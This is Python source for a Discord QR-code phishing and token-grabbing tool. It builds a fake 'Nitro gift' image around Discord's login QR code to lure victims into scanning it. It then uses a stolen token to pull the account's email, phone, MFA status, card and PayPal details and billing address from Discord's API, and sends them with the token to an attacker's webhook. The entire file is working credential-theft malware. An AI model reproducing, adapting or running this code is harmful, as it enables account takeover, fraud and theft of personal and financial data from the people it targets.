import os
from discord_webhook import DiscordEmbed, DiscordWebhook
from discord_webhook.webhook_exceptions import ColorNotInRangeException
from PIL import Image
from requests import get
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from constants import (
    EMBED_AVATAR,
    EMBED_COLOR,
    EMBED_USERNAME,
    PAYMENT_CARD,
    PAYMENT_PAYPAL,
)
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure


class QRGrabber:
    __slots__ = "resources_path"

    def __init__(self, resources_path: str) -> None:
        self.resources_path = resources_path

    def get_qr_from_source(self, driver: webdriver):
        elements = driver.find_elements(By.TAG_NAME, "svg")
        if len(elements) != 4:
            raise QRCodeNotFound(
                "The QR code could not be found on the Discord page"
            )
        element = elements[2]
        return element.get_attribute("outerHTML")

    def generate_qr_for_template(self, path_1: str, path_2: str) -> None:
        qr_img = Image.open(path_1, "r")
        ovly_img = Image.open(
            os.path.join(
                os.path.dirname(os.path.realpath(__file__)),
                self.resources_path,
                "overlay.png",
            ),
            "r",
        )
        qr_width, qr_height = qr_img.size
        center_x = qr_width // 2
        center_y = qr_height // 2
        logo_width, logo_height = ovly_img.size
        logo_top_left_x = center_x - logo_width // 2
        logo_top_left_y = center_y - logo_height // 2
        qr_img.paste(ovly_img, (logo_top_left_x, logo_top_left_y))
        qr_img.save(path_2, quality=95)

    def generate_nitro_template(self, path_2: str) -> None:
        nitro_template = Image.open(
            os.path.join(
                os.path.dirname(os.path.realpath(__file__)),
                self.resources_path,
                "template.png",
            ),
            "r",
        )
        nitro_template.paste(Image.open(path_2, "r"), (120, 409))
        nitro_template.save("discord_gift.png", quality=95)


class TokenInfo:
    __slots__ = (
        "headers",
        "token",
        "id",
        "username",
        "discriminator",
        "email",
        "phone",
        "mfa_enabled",
        "has_nitro",
        "payment_source",
        "card_brand",
        "card_last_4_digits",
        "card_expiry_date",
        "paypal_email",
        "billing_name",
        "address_1",
        "address_2",
        "country",
        "state",
        "city",
        "postal_code",
    )

    def __init__(self, token: str) -> None:
        self.headers = {"Authorization": token, "Content-Type": "application/json"}

        if not self.check_token():
            raise InvalidToken

        # Use v9 API instead of deprecated v6
        std_response = get(
            "https://discord.com/api/v9/users/@me", headers=self.headers
        ).json()
        
        payment_response = []
        try:
            payment_resp = get(
                "https://discord.com/api/v9/users/@me/billing/payment-sources",
                headers=self.headers,
            )
            if payment_resp.status_code == 200:
                payment_response = payment_resp.json()
        except:
            pass
        
        subscriptions_response = []
        try:
            subs_resp = get(
                "https://discord.com/api/v9/users/@me/billing/subscriptions",
                headers=self.headers,
            )
            if subs_resp.status_code == 200:
                subscriptions_response = subs_resp.json()
        except:
            pass

        self.token = token
        self.id = std_response.get("id", "Unknown")
        self.username = std_response.get("username", "Unknown")
        # Discord removed discriminators, fall back to "0" if not present
        self.discriminator = std_response.get("discriminator", "0")
        self.email = std_response.get("email", "None")
        self.phone = std_response.get("phone", "None")
        mfa = std_response.get("mfa_enabled", False)
        self.mfa_enabled = "enabled" if mfa else "disabled"
        self.has_nitro = bool(subscriptions_response)

        self.payment_source = None
        self.card_brand = None
        self.card_last_4_digits = None
        self.card_expiry_date = None
        self.paypal_email = None
        self.billing_name = None
        self.address_1 = None
        self.address_2 = None
        self.country = None
        self.state = None
        self.city = None
        self.postal_code = None

        if bool(payment_response) and isinstance(payment_response, list):
            for data in payment_response:
                try:
                    payment_type = data.get("type", 0)
                    if payment_type == 1 or payment_type == 2:
                        if payment_type == 1:
                            self.payment_source = PAYMENT_CARD
                            self.card_brand = data.get("brand", "Unknown")
                            self.card_last_4_digits = data.get("last_4", "****")
                            expires_month = data.get("expires_month", "??")
                            expires_year = data.get("expires_year", "????")
                            self.card_expiry_date = f"{expires_month}/{expires_year}"
                        elif payment_type == 2:
                            self.payment_source = PAYMENT_PAYPAL
                            self.paypal_email = data.get("email", "Unknown")
                        
                        # Safely get billing address
                        billing = data.get("billing_address", {})
                        if billing:
                            self.billing_name = billing.get("name", "Unknown")
                            self.address_1 = billing.get("line_1", "Unknown")
                            self.address_2 = billing.get("line_2", "")
                            self.country = billing.get("country", "Unknown")
                            self.state = billing.get("state", "Unknown")
                            self.city = billing.get("city", "Unknown")
                            self.postal_code = billing.get("postal_code", "Unknown")
                        break  # Only process first payment method
                except Exception as e:
                    print(f"[!] Error parsing payment info: {e}")
                    continue

    def send_info_to_webhook(self, webhook_url: str) -> bool:
        try:
            webhook = DiscordWebhook(
                url=webhook_url, username=EMBED_USERNAME, avatar_url=EMBED_AVATAR
            )
            embed = DiscordEmbed(color=EMBED_COLOR)
            
            # Handle new Discord username system (no more discriminators)
            if self.discriminator == "0":
                display_name = f"**{self.username}**"
            else:
                display_name = f"**{self.username}#{self.discriminator}**"
            
            embed.add_embed_field(
                name="User Token Info",
                value=f""":crown:`Username:` {display_name}
:id:`User ID:` **{self.id}**
:e_mail:`Mail:` **{self.email}**
:mobile_phone:`Phone:` **{self.phone}**
:money_with_wings:`Nitro:` **{':white_check_mark:' if self.has_nitro else ':x:'}**""",
                inline=False,
            )

            if self.billing_name is not None:
                if self.payment_source == PAYMENT_CARD:
                    embed.add_embed_field(
                        name="Payment Info (Debit or Credit Card)",
                        value=f""":credit_card:`Brand:` ||**{self.card_brand}**||
:information_source:`Last 4:` ||**{self.card_last_4_digits}**||
:date:`Expiration:` ||**{self.card_expiry_date}**||""",
                    )

                elif self.payment_source == PAYMENT_PAYPAL:
                    embed.add_embed_field(
                        name="Payment Info (Paypal)",
                        value=f":incoming_envelope:`Paypal Mail:` ||**{self.paypal_email}**||",
                    )

                embed.add_embed_field(
                    name="Billing Address",
                    value=f"""***Billing Adress:***
:name_badge:`Name:` ||**{self.billing_name}**||
:paperclip:`Line 1:` ||**{self.address_1}**||
:paperclips:`Line 2:` ||**{self.address_2}**||
:flag_white:`Country:` ||**{self.country}**||
:triangular_flag_on_post:`State:` ||**{self.state}**||
:cityscape:`City:` ||**{self.city}**||
:postbox:`Postal Code:` ||**{self.postal_code}**||
""",
                    inline=False,
                )

            else:
                embed.add_embed_field(
                    name="Payment Info (:x:)",
                    value="**No Payment Info Founded.**\n",
                    inline=False,
                )
            embed.add_embed_field(
                name="Token", value=f"```yaml\n{self.token}\n```", inline=False
            )
            embed.set_footer(text="By alcachofo")
            webhook.add_embed(embed)
            webhook.execute()
            return True
        except ColorNotInRangeException as e:
            raise WebhookSendFailure(
                f"Failed to send the token information webhook: {e}"
            )

    def check_token(self) -> bool:
        # Use v9 API
        response = get("https://discord.com/api/v9/users/@me", headers=self.headers)
        if response.status_code == 200:
            return True
        else:
            return False

    def __repr__(self) -> str:
        return self.__dir__()
